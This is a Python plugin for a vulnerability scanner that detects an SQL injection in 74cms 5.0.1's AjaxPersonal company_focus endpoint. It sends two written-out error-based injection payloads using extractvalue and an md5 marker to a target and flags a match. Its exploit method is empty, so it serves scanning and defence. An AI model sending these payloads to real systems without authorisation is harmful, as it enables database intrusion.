#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
74cms 5.0.1 前台AjaxPersonalController.class.php存在SQL注入
    暂无编号
        Payload: https://github.com/chaitin/xray/blob/master/pocs/74cms-sqli.yml
'''

from PluginManager import Vuln_Scan
from lib.tool.md5 import md5, random_int_1

class Scan(Vuln_Scan):
    def __init__(self):
        self.payloads = [
            {'path': 'index.php?m=&c=AjaxPersonal&a=company_focus&company_id[0]=match&company_id[1][0]=aaaaaaa") and extractvalue(1,concat(0x7e,md5({RANNUM}))) -- a'},
            {'path': 'upload/index.php?m=&c=AjaxPersonal&a=company_focus&company_id[0]=match&company_id[1][0]=aaaaaaa") and extractvalue(1,concat(0x7e,md5({RANNUM}))) -- a'},
        ]
    
    def POC(self, clients):
        client = clients.get('reqClient')
        
        vul_info = {
            'app_name': '74cms',
            'vul_type': 'SQLinject',
            'vul_id': '74cms-v5.0.1-sqlinject',
        }
        
        for payload in self.payloads:
            randomNum = random_int_1(6)                # * 随机6位数字
            
            path = payload['path'].format(RANNUM=randomNum)

            res = client.request(
                'get',
                path,
                allow_redirects=False,
                vul_info=vul_info
            )
            if res is None:
                continue
            
            md = md5(str(randomNum), 31)    # * 计算随机数字的md5值, 取31位(0-30)

            if (md in res.text):
                results = {
                    'Target': res.url,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results
        return None
    
    def EXP(self, clients):
        pass

    def Start(self, clients):
        return self.POC(clients)
    